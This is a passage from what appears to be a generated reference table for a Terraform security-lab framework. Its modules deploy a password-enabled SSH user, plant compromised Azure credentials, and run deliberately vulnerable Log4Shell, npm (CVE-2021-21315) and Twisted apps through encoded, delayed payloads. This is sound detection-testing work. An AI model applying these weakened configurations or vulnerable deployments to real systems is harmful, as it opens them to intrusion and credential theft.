                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-ssh-user                                          | ./modules/runbook/deploy-ssh-user                    | runbook_deploy_ssh_user                          | context.azure.runbook.ssh_user                                    | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;ssh_user&quot;: {<br/>                    &quot;enabled&quot;: false,<br/>                    &quot;password&quot;: null,<br/>                    &quot;username&quot;: &quot;lou.caloozer&quot;<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                    | <pre>locals \{<br/>    password = try\(length\(var\.inputs\[&quot;password&quot;\]\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;password&quot;\] :  random\_password\.password\.result<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $\{var\.inputs\[&quot;username&quot;\]\}&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password $\{var\.inputs\[&quot;username&quot;\]\} \|\| log &quot;$\{var\.inputs\[&quot;username&quot;\]\} user already exists&quot;<br/>    log &quot;Setting passwd: $\{local\.password\}&quot;<br/>    echo &#x27;$\{var\.inputs\[&quot;username&quot;\]\}:$\{local\.password\}&#x27; \| chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd\_config\.d&quot;<br/>    cat &gt; /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &#x27;We talked about this guys\. No SSH for you\!&#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    Match User $\{var\.inputs\[&quot;username&quot;\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource &quot;random\_password&quot; &quot;password&quot; \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = &quot;\!\#$%&amp;\*\(\)\-\_=\+\[\]\{\}&lt;&gt;:?&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| target-azure-credentials                                 | ./modules/runbook/deploy-azure-credentials           | runbook_deploy_secret_azure_credentials          | context.azure.runbook.azure_credentials                           | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;azure_credentials&quot;: {<br/>                    &quot;compromised_keys_user&quot;: null,<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-azure-credentials           | <pre>locals \{<br/>    tool = &quot;az&quot;<br/>    azure\_creds = var\.inputs\[&quot;compromised\_credentials&quot;\]\[var\.inputs\[&quot;compromised\_keys\_user&quot;\]\]\.rendered<br/>    \# AZURE\_CLIENT\_ID: The Application \(client\) ID of the service principal\.<br/>    \# AZURE\_CLIENT\_SECRET: The client secret for the service principal\.<br/>    \# AZURE\_TENANT\_ID: The Tenant ID associated with your Azure subscription\.<br/>    \# AZURE\_SUBSCRIPTION\_ID: Your Azure Subscription ID\.<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Deploying azure credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.azure<br/>    if \[  &quot;$\{ local\.azure\_creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; \}&quot; == &quot;true&quot; \]; then<br/>      echo $\{base64gzip\(local\.azure\_creds\)\} \| base64 \-d \| gunzip &gt; ~/\.azure/my\.azureauth<br/>      export AZURE\_AUTH\_LOCATION=~/\.azure/my\.azureauth<br/>    fi<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-vulnerable-docker-log4j-app                       | ./modules/runbook/deploy-docker-log4j-app            | runbook_deploy_docker_log4j_app                  | context.azure.runbook.vulnerable.docker.log4j_app                 | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;docker&quot;: {<br/>                        &quot;log4j_app&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app            | <pre>locals \{<br/>    image = &quot;ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log &quot;$\(echo &#x27;docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}&#x27;\)&quot;<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-vulnerable-log4j-app                              | ./modules/runbook/deploy-log4j-app                   | runbook_deploy_log4j_app                         | context.azure.runbook.vulnerable.log4j_app                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;log4j_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                   | <pre>locals \{<br/>    app\_dir = &quot;/vuln\-log4j\-app&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log &quot;creating local files\.\.\.&quot;<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip &gt; web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  &gt; ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/><br/>    \# install java 8u131<br/>    log &quot;checking for jdk1\.8\.0\_131\.\.\.&quot;<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log &quot;jdk1\.8\.0\_131 not found \- installing\.\.\.&quot;<br/>        wget \-c \-\-header &quot;Cookie: oraclelicense=accept\-securebackup\-cookie&quot; http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log &quot;jdk1\.8\.0\_131 found \- skipping install&quot;<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log &quot;setting up java environment for build\.\.\.&quot;<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# download gradle 7\.3\.1<br/>    log &quot;checking for gradle 7\.3\.1\.\.\.&quot;<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log &quot;gradle not found \- installing\.\.\.&quot;<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log &quot;gradle 7\.3\.1 found \- skipping install&quot; <br/>    fi<br/><br/>    \# update gradle path<br/>    log &quot;updating environment PATH to include gradle\.\.\.&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log &quot;cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\.&quot;<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log &quot;running gradle build\.\.\.&quot;<br/>    nohup gradle bootJar \-\-no\-daemon &amp;<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running\.\.\.&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete\.&quot;<br/>    <br/>    ls \-ltr build/libs/\*\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# copy java jar<br/>    log &quot;Copying java jar\.\.&quot;<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\[&quot;listen\_port&quot;\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl unzip git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl unzip git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            &quot;$\{path\.module\}/resources/web\.py&quot;,<br/>                        \)<br/><br/>    ldap = file\(<br/>                            &quot;$\{path\.module\}/resources/ldap\.py&quot;,<br/>                        \)<br/>    requirements = file\(<br/>                            &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-vulnerable-npm-app                                | ./modules/runbook/deploy-npm-app                     | runbook_deploy_npm_app                           | context.azure.runbook.vulnerable.npm_app                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;npm_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals \{<br/>    repo = &quot;https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log &quot;checking for git\.\.\.&quot;<br/>    while \! command \-v git; do<br/>        log &quot;git not found \- waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $\(command \-v  git\)&quot;<br/>    rm \-rf /vuln\_npm\_app\_target &amp;&amp; \\<br/>    mkdir /vuln\_npm\_app\_target &amp;&amp; \\<br/>    cd /vuln\_npm\_app\_target &amp;&amp; \\<br/>    git clone $\{local\.repo\} &amp;&amp; \\<br/>    cd CVE\-2021\-21315\-PoC &amp;&amp; \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip &gt; index\.js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl nodejs npm&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl nodejs npm&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                &quot;$\{path\.module\}/resources/index\.js&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| target-vulnerable-python3-twisted-app                    | ./modules/runbook/deploy-python3-twisted-app         | runbook_deploy_python3_twisted_app               | context.azure.runbook.vulnerable.python3_twisted_app              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;python3_twisted_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER &amp;&amp; $PACKAGE\_MANAGER list \| grep &quot;python3\-twisted&quot; \| grep &quot;18\.9\.0\-11ubuntu0\.20\.04&quot;; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>        log &quot;installing requirements\.\.\.&quot;<br/>        python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen \-S 